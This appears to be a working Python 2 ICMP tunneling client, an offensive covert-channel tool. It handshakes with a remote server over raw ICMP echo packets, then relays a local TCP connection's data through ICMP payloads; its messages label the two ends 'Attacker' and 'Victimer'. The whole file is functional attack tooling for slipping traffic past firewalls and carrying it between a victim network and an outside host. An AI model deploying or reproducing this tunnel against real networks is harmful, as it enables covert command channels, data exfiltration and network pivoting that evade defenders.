# coding=utf-8
import sys
import md5
import time
import select
import socket
import struct
from handle_log import logger

VER = '\x01\x01'
SEQUENCE = 0
PACKETSIZE = 1024
HANDSHAKE = 'HELLO'
HEARTBEATFLAG = ''
CLOSETCPFLAG = ''


class IcmpSocket:
    def __init__(self, MODE):
        self.ICMP_ECHO_REQUEST = 0x08
        self.ICMP_ECHO_REPLY = 0x00
        if MODE == 0:
            self.ICMP_SEND = self.ICMP_ECHO_REPLY
            self.ICMP_RECV = self.ICMP_ECHO_REQUEST
            self.ICMP_CODE = 0x00
        else:
            # 0
            self.ICMP_RECV = self.ICMP_ECHO_REPLY
            # 8
            self.ICMP_SEND = self.ICMP_ECHO_REQUEST
            self.ICMP_CODE = 0x00

        self.MAX_DATA_SIZE = 1024
        self.TIMEOUT = 300
        self.ID = 0x100
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))

    def bind(self, address):
        self.sock.bind((address, 0))
        return IcmpSocket

    def checksum(self, source_string):
        sum = 0
        count_to = (len(source_string) / 2) * 2
        for count in xrange(0, count_to, 2):
            this = ord(source_string[count + 1]) * 256 + ord(source_string[count])
            sum = sum + this
            sum = sum & 0xffffffff

        if count_to < len(source_string):
            sum = sum + ord(source_string[len(source_string) - 1])
            sum = sum & 0xffffffff

        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)

        return answer

    def recv(self, buffsize):
        time_left = self.TIMEOUT
        while True:
            started_select = time.time()
            what_ready = select.select([self.sock], [], [], time_left)
            time_received = time.time()
            how_long_in_select = (time_received - started_select)
            if not what_ready[0]:
                return
            # 接收30个字节的数据
            packet, addr = self.sock.recvfrom(buffsize + 28)
            # 获取Icmp头部
            icmpHeader = packet[20:28]
            # 解包
            type, code, checksum, packetID, sequence = struct.unpack(
                "bbHHh", icmpHeader
            )
            # 判断回包
            if type == self.ICMP_RECV and code == self.ICMP_CODE:
                # 返回ICMP数据，id，序号和地址
                return packet[28:], packetID, sequence, addr

            time_left = time_left - how_long_in_select
            if time_left <= 0:
                return

    def send(self, dest_addr, data, packetID, sequence):
        """包装sendto"""
        logger.debug("client send data: {}".format(data))
        # 输入的可能是域名或主机名，解析为IP地址
        dest_addr = socket.gethostbyname(dest_addr)
        my_checksum = 0
        # 8,0,0,0x100,0
        header = struct.pack("bbHHh", self.ICMP_SEND, self.ICMP_CODE, my_checksum, packetID, sequence)
        # data=\x01\x01',HELLO
        my_checksum = self.checksum(header + data)
        header = struct.pack(
            "bbHHh", self.ICMP_SEND, self.ICMP_CODE, socket.htons(my_checksum), packetID, sequence
        )
        packet = header + data
        self.sock.sendto(packet, 0, (dest_addr, 0))


def GetMd5(src):
    m = md5.new()
    m.update(src)
    return m.hexdigest()


def PrintHex(buf):
    for b in buf:
        logger.debug("server send data: {}".format(hex(ord(b))))

def _TransData(ss, icmpsock, rip):
    """
    :param ss: tcp client socket
    :param icmpsock:
    :param rip: 服务端地址
    :return:
    """
    socks = [ss, icmpsock.sock]
    while True:
        try:
            r, w, e = select.select(socks, [], socks, 0.2)
            if ss in r:
                try:
                    # tcp client 从端口中收数据
                    recv = ss.recv(PACKETSIZE)
                    logger.debug("client recv tcp {} bytes data".format(len(recv)))
                    if len(recv) > 0:
                        # 将tcp 从client中收到的数据发向icmp
                        icmpsock.send(rip, recv, icmpsock.ID, SEQUENCE)
                        logger.debug("client send icmp {} bytes data".format(len(recv)))
                    else:
                        print "Attacker is offline"
                        icmpsock.send(rip, CLOSETCPFLAG, icmpsock.ID, SEQUENCE)
                        ss.close()
                        return -1
                except Exception as e:
                    print(e), sys._getframe().f_lineno
                    return -1
            elif icmpsock.sock in r:
                recv, id, seq, addr = icmpsock.recv(PACKETSIZE)
                if recv == CLOSETCPFLAG:
                    print "Victimer is offline"
                    ss.close()
                    return -1
                else:
                    logger.debug("client recv icmp {} bytes data".format(len(recv)))
                    ss.send(recv)
                    logger.debug("client send tcp {} bytes data".format(len(recv)))
            else:
                icmpsock.send(rip, HEARTBEATFLAG, icmpsock.ID, SEQUENCE)
        except Exception as e:
            print e, sys._getframe().f_lineno
            return -1


def _StartConnect(rip, mode, tip, tport):
    global SEQUENCE
    global HEARTBEATFLAG
    global CLOSETCPFLAG

    icmpsock = IcmpSocket(mode)  # 1 Client Mode
    icmpsock.bind('0.0.0.0')
    # 传入VPS的IP,'\x01\x01',HELLO,0x100,0
    icmpsock.send(rip, VER + HANDSHAKE, icmpsock.ID, SEQUENCE)
    # 返回ICMP数据，id，序号和地址,接收2+28个字节数据
    data, id, seq, addr = icmpsock.recv(2)
    PrintHex(data)
    ExitCode = 1
    if seq != 0:
        SEQUENCE = seq
        HEARTBEATFLAG = GetMd5(str(seq) + 'TS')
        logger.debug("HEARTBEATFLAG is {}".format(HEARTBEATFLAG))
        CLOSETCPFLAG = GetMd5(str(seq) + 'TCP')
        icmpsock.send(rip, HEARTBEATFLAG, icmpsock.ID, SEQUENCE)
        # 服务端回复的0100
        if ord(data[0]) == 1 and ord(data[1]) == 0:
            while (ExitCode):
                data, id, seq, addr = icmpsock.recv(2)
                PrintHex(data)
                # 服务端回复了0000
                if ord(data[0]) == 0 and ord(data[1]) == 0:
                    # 创建TCP连接
                    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cs.connect((tip, tport))
                    logger.debug("client tcp connect {} success".format(tip))
                    ExitCode = _TransData(cs, icmpsock, rip)


if __name__ == '__main__':
    a1 = sys.argv[1]
    a2 = sys.argv[2]
    a3 = sys.argv[3]
    _StartConnect(a1, 1, a2, int(a3))
